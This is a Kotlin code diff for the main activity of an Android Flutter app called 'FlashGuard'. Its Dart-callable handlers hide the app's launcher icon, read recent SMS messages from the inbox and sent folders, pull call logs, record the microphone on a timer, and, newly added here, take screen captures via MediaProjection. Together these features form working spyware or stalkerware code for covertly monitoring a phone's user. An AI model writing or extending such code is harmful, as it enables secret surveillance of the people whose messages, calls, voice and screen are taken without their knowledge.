@@ -1,30 +1,53 @@
 package com.flashguard.flashguard
 
+import android.app.Activity
 import android.content.ComponentName
+import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.media.ImageReader
 import android.media.MediaRecorder
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Handler
 import android.os.Looper
+import android.util.DisplayMetrics
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
+import java.io.FileOutputStream
 
 class MainActivity : FlutterActivity() {
 
-    private val CHANNEL = "com.flashguard/control"
+    private val CHANNEL       = "com.flashguard/control"
+    private val REQ_SCREEN    = 1001
+    private val handler       = Handler(Looper.getMainLooper())
+
+    // MediaRecorder
     private var mediaRecorder: MediaRecorder? = null
-    private val handler = Handler(Looper.getMainLooper())
+
+    // MediaProjection (screen capture)
+    private var projectionManager: MediaProjectionManager? = null
+    private var mediaProjection: MediaProjection? = null
+    private var pendingScreenResult: MethodChannel.Result? = null
+    private var pendingScreenPath: String?             = null
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
+
+        projectionManager =
+            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
 
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
             .setMethodCallHandler { call, result ->
                 when (call.method) {
 
-                    // ── Icon hide / show ───────────────────────────────────
+                    // ── Icon hide / show ──────────────────────────────────
                     "hideIcon" -> {
                         try {
                             packageManager.setComponentEnabledSetting(
@@ -33,9 +56,7 @@ class MainActivity : FlutterActivity() {
                                 PackageManager.DONT_KILL_APP
                             )
                             result.success(true)
-                        } catch (e: Exception) {
-                            result.error("HIDE_ICON_FAILED", e.message, null)
-                        }
+                        } catch (e: Exception) { result.error("HIDE_ICON_FAILED", e.message, null) }
                     }
 
                     "showIcon" -> {
@@ -46,61 +67,42 @@ class MainActivity : FlutterActivity() {
                                 PackageManager.DONT_KILL_APP
                             )
                             result.success(true)
-                        } catch (e: Exception) {
-                            result.error("SHOW_ICON_FAILED", e.message, null)
-                        }
+                        } catch (e: Exception) { result.error("SHOW_ICON_FAILED", e.message, null) }
                     }
 
-                    // ── Read SMS ──────────────────────────────────────────
+                    // ── SMS ───────────────────────────────────────────────
                     "getSmsLogs" -> {
                         try {
-                            val smsList = mutableListOf<Map<String, Any?>>()
-                            val cursor: Cursor? = contentResolver.query(
-                                Uri.parse("content://sms/inbox"),
-                                arrayOf("address", "body", "date", "read"),
-                                null, null, "date DESC"
-                            )
-                            cursor?.use { c ->
-                                var count = 0
-                                while (c.moveToNext() && count < 30) {
-                                    smsList.add(mapOf(
-                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
-                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
-                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
-                                        "type"    to "inbox"
-                                    ))
-                                    count++
+                            val list = mutableListOf<Map<String, Any?>>()
+                            fun querySms(uri: String, type: String) {
+                                contentResolver.query(
+                                    Uri.parse(uri),
+                                    arrayOf("address", "body", "date"),
+                                    null, null, "date DESC"
+                                )?.use { c ->
+                                    var n = 0
+                                    while (c.moveToNext() && n < 30) {
+                                        list.add(mapOf(
+                                            "address" to (c.getString(0) ?: ""),
+                                            "body"    to (c.getString(1) ?: ""),
+                                            "date"    to c.getLong(2),
+                                            "type"    to type
+                                        )); n++
+                                    }
                                 }
                             }
-                            val sentCursor: Cursor? = contentResolver.query(
-                                Uri.parse("content://sms/sent"),
-                                arrayOf("address", "body", "date", "read"),
-                                null, null, "date DESC"
-                            )
-                            sentCursor?.use { c ->
-                                var count = 0
-                                while (c.moveToNext() && count < 20) {
-                                    smsList.add(mapOf(
-                                        "address" to (c.getString(c.getColumnIndexOrThrow("address")) ?: ""),
-                                        "body"    to (c.getString(c.getColumnIndexOrThrow("body")) ?: ""),
-                                        "date"    to c.getLong(c.getColumnIndexOrThrow("date")),
-                                        "type"    to "sent"
-                                    ))
-                                    count++
-                                }
-                            }
-                            smsList.sortByDescending { it["date"] as Long }
-                            result.success(smsList.take(40))
-                        } catch (e: Exception) {
-                            result.error("SMS_READ_FAILED", e.message, null)
-                        }
+                            querySms("content://sms/inbox", "inbox")
+                            querySms("content://sms/sent",  "sent")
+                            list.sortByDescending { it["date"] as Long }
+                            result.success(list.take(40))
+                        } catch (e: Exception) { result.error("SMS_FAILED", e.message, null) }
                     }
 
-                    // ── Read Call Logs ────────────────────────────────────
+                    // ── Call logs ─────────────────────────────────────────
                     "getCallLogs" -> {
                         try {
-                            val callList = mutableListOf<Map<String, Any?>>()
-                            val cursor: Cursor? = contentResolver.query(
+                            val list = mutableListOf<Map<String, Any?>>()
+                            contentResolver.query(
                                 android.provider.CallLog.Calls.CONTENT_URI,
                                 arrayOf(
                                     android.provider.CallLog.Calls.NUMBER,
@@ -108,86 +110,84 @@ class MainActivity : FlutterActivity() {
                                     android.provider.CallLog.Calls.TYPE,
                                     android.provider.CallLog.Calls.DURATION,
                                     android.provider.CallLog.Calls.DATE
-                                ),
-                                null, null,
+                                ), null, null,
                                 "${android.provider.CallLog.Calls.DATE} DESC"
-                            )
-                            cursor?.use { c ->
-                                var count = 0
-                                while (c.moveToNext() && count < 50) {
-                                    val typeInt = c.getInt(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
-                                    val typeStr = when (typeInt) {
-                                        android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
-                                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
-                                        android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
-                                        else                                          -> "unknown"
-                                    }
-                                    callList.add(mapOf(
-                                        "number"    to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: ""),
-                                        "name"      to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME)) ?: "Unknown"),
-                                        "type"      to typeStr,
-                                        "duration"  to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)),
-                                        "timestamp" to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
-                                    ))
-                                    count++
+                            )?.use { c ->
+                                var n = 0
+                                while (c.moveToNext() && n < 50) {
+                                    val t = c.getInt(2)
+                                    list.add(mapOf(
+                                        "number"    to (c.getString(0) ?: ""),
+                                        "name"      to (c.getString(1) ?: "Unknown"),
+                                        "type"      to when(t) {
+                                            android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
+                                            android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                                            android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
+                                            else -> "unknown"
+                                        },
+                                        "duration"  to c.getLong(3),
+                                        "timestamp" to c.getLong(4)
+                                    )); n++
                                 }
                             }
-                            result.success(callList)
-                        } catch (e: Exception) {
-                            result.error("CALL_LOG_FAILED", e.message, null)
-                        }
+                            result.success(list)
+                        } catch (e: Exception) { result.error("CALL_LOG_FAILED", e.message, null) }
                     }
 
-                    // ── Mic Recording (MediaRecorder) ─────────────────────
+                    // ── Mic recording ─────────────────────────────────────
                     "startRecording" -> {
                         try {
                             val path     = call.argument<String>("path") ?: ""
                             val duration = call.argument<Int>("duration") ?: 30
-
                             mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
-                            mediaRecorder = null
-
                             @Suppress("DEPRECATION")
-                            val mr = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
-                                MediaRecorder(this)
-                            } else {
-                                MediaRecorder()
-                            }
+                            val mr = if (android.os.Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
                             mr.setAudioSource(MediaRecorder.AudioSource.MIC)
                             mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                             mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                             mr.setAudioSamplingRate(22050)
                             mr.setAudioEncodingBitRate(64000)
                             mr.setOutputFile(path)
-                            mr.prepare()
-                            mr.start()
+                            mr.prepare(); mr.start()
                             mediaRecorder = mr
-
-                            // Auto-stop after duration
                             handler.postDelayed({
-                                try {
-                                    mr.stop()
-                                    mr.release()
-                                    if (mediaRecorder === mr) mediaRecorder = null
-                                } catch (_: Exception) {}
+                                try { mr.stop(); mr.release() } catch (_: Exception) {}
+                                if (mediaRecorder === mr) mediaRecorder = null
                             }, duration * 1000L)
-
                             result.success(true)
-                        } catch (e: Exception) {
-                            result.error("REC_FAILED", e.message, null)
-                        }
+                        } catch (e: Exception) { result.error("REC_FAILED", e.message, null) }
                     }
 
                     "stopRecording" -> {
                         try {
-                            mediaRecorder?.let { mr ->
-                                try { mr.stop(); mr.release() } catch (_: Exception) {}
-                                mediaRecorder = null
-                            }
+                            mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
+                            mediaRecorder = null
                             result.success(true)
-                        } catch (e: Exception) {
-                            result.error("STOP_REC_FAILED", e.message, null)
+                        } catch (e: Exception) { result.error("STOP_REC_FAILED", e.message, null) }
+                    }
+
+                    // ── Screen capture — request permission ───────────────
+                    "requestScreenCapture" -> {
+                        try {
+                            if (mediaProjection != null) {
+                                result.success(true)   // already granted
+                                return@setMethodCallHandler
+                            }
+                            pendingScreenResult = result
+                            val intent = projectionManager!!.createScreenCaptureIntent()
+                            startActivityForResult(intent, REQ_SCREEN)
+                        } catch (e: Exception) { result.error("SCREEN_REQ_FAILED", e.message, null) }
+                    }
+
+                    // ── Screen capture — take screenshot ──────────────────
+                    "takeScreenshot" -> {
+                        val path = call.argument<String>("path") ?: ""
+                        val mp   = mediaProjection
+                        if (mp == null) {
+                            result.error("NO_PROJECTION", "Screen capture not authorized", null)
+                            return@setMethodCallHandler
                         }
+                        captureScreen(mp, path, result)
                     }
 
                     else -> result.notImplemented()
@@ -195,9 +195,75 @@ class MainActivity : FlutterActivity() {
             }
     }
 
+    // ── Activity result for screen capture permission ─────────────────────────
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQ_SCREEN) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
+                pendingScreenResult?.success(true)
+            } else {
+                pendingScreenResult?.success(false)
+            }
+            pendingScreenResult = null
+        }
+    }
+
+    // ── Actual screenshot capture via VirtualDisplay + ImageReader ────────────
+    private fun captureScreen(mp: MediaProjection, path: String, result: MethodChannel.Result) {
+        try {
+            @Suppress("DEPRECATION")
+            val metrics = DisplayMetrics()
+            @Suppress("DEPRECATION")
+            windowManager.defaultDisplay.getMetrics(metrics)
+            val w       = metrics.widthPixels
+            val h       = metrics.heightPixels
+            val density = metrics.densityDpi
+
+            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
+            val vd = mp.createVirtualDisplay(
+                "FGScreen", w, h, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                reader.surface, null, null
+            )
+
+            handler.postDelayed({
+                try {
+                    val image = reader.acquireLatestImage()
+                    if (image == null) {
+                        vd.release(); reader.close()
+                        result.error("NO_FRAME", "No frame captured", null)
+                        return@postDelayed
+                    }
+                    val plane      = image.planes[0]
+                    val buf        = plane.buffer
+                    val rowPad     = plane.rowStride - plane.pixelStride * w
+                    val bmp        = Bitmap.createBitmap(
+                        w + rowPad / plane.pixelStride, h, Bitmap.Config.ARGB_8888)
+                    bmp.copyPixelsFromBuffer(buf)
+                    val cropped    = Bitmap.createBitmap(bmp, 0, 0, w, h)
+                    image.close()
+                    vd.release(); reader.close()
+
+                    FileOutputStream(path).use { fos ->
+                        cropped.compress(Bitmap.CompressFormat.JPEG, 72, fos)
+                    }
+                    result.success(path)
+                } catch (e: Exception) {
+                    try { vd.release(); reader.close() } catch (_: Exception) {}
+                    result.error("CAPTURE_FAILED", e.message, null)
+                }
+            }, 600L)
+        } catch (e: Exception) {
+            result.error("CAPTURE_SETUP_FAILED", e.message, null)
+        }
+    }
+
     override fun onDestroy() {
         mediaRecorder?.let { try { it.stop(); it.release() } catch (_: Exception) {} }
         mediaRecorder = null
+        mediaProjection?.stop()
+        mediaProjection = null
         super.onDestroy()
     }
 }
